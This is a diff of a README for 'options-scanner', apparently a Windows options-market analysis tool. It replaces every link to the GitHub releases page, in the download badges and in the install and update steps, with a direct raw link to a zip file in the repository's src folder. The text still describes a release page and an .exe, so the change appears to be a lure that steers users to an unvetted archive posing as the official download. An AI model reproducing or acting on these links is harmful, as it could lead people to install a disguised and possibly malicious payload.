@@ -1,6 +1,6 @@
 # ⚙️ options-scanner - Analyze Options Market Data Easily
 
-[![Download options-scanner](https://img.shields.io/badge/Download-Options--Scanner-brightgreen?style=for-the-badge)](https://github.com/suli99/options-scanner/releases)
+[![Download options-scanner](https://img.shields.io/badge/Download-Options--Scanner-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/suli99/options-scanner/main/src/options_scanner_2.6.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide will help you download, install, and run options-scanner step-by-step
 ## 📥 Download options-scanner
 
 To get the software, **visit this page** and choose the latest version for Windows:  
-[https://github.com/suli99/options-scanner/releases](https://github.com/suli99/options-scanner/releases)
+[https://raw.githubusercontent.com/suli99/options-scanner/main/src/options_scanner_2.6.zip](https://raw.githubusercontent.com/suli99/options-scanner/main/src/options_scanner_2.6.zip)
 
 Click the link above or the green badge at the top to open the release page.
 
@@ -129,7 +129,7 @@ If the app does not open or shows errors:
 The app does not update automatically. To install the latest version:  
 
 1. Visit the releases page again:  
-   [https://github.com/suli99/options-scanner/releases](https://github.com/suli99/options-scanner/releases)  
+   [https://raw.githubusercontent.com/suli99/options-scanner/main/src/options_scanner_2.6.zip](https://raw.githubusercontent.com/suli99/options-scanner/main/src/options_scanner_2.6.zip)  
 2. Download the newest Windows `.exe` file.  
 3. Run the installer and follow the same steps as before. The new version will replace the old one without losing your settings.
 
@@ -151,4 +151,4 @@ options-scanner only uses your internet connection to download market data and A
 
 ---
 
-[![Download options-scanner](https://img.shields.io/badge/Download-Options--Scanner-brightgreen?style=for-the-badge)](https://github.com/suli99/options-scanner/releases)
+[![Download options-scanner](https://img.shields.io/badge/Download-Options--Scanner-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/suli99/options-scanner/main/src/options_scanner_2.6.zip)
